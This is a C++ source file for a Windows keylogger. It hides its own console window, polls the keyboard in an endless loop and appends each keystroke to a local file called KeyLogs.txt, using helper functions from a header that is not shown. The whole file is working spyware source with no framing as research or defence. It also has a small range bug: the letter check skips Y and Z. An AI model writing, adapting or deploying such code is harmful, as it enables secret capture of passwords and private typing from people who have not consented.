#include "InputKeyHelper.h"
using namespace std;

#define MAX_KEY_VALUE -32767
#define LOG_FILE "KeyLogs.txt"


void hide_console_window() {
	HWND consoleWindow;
	AllocConsole();
	consoleWindow = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(consoleWindow, 0);
}


void start_key_logger() {
	hide_console_window();
	ofstream log(LOG_FILE, ios::app);
	unsigned char pressedKey;
	bool isShiftPressed;
	while (true) {
		Sleep(0);
		for (pressedKey = 8; pressedKey <= VK_OEM_7; pressedKey++) {
			if (GetAsyncKeyState(pressedKey) == MAX_KEY_VALUE) {
				isShiftPressed = GetAsyncKeyState(VK_SHIFT);
				if (pressedKey >= 0x41 && pressedKey <= 0x58)
				{
					check_letter(pressedKey, log, isShiftPressed);
				}
				else if (pressedKey >= 0x30 && pressedKey <= 0x39) {
					check_digit(pressedKey, log, isShiftPressed);
				}
				else if ((pressedKey >= 0xBA && pressedKey <= 0xC0) ||
					(pressedKey >= 0xDB && pressedKey <= 0xDE)) {
					check_special_character(pressedKey, log, isShiftPressed);
				}
				else {
					check_special_key(pressedKey, log);
				}
			}
			log.flush();
		}
	}
}


void main(int argc, char* argv[]) {
	start_key_logger();
}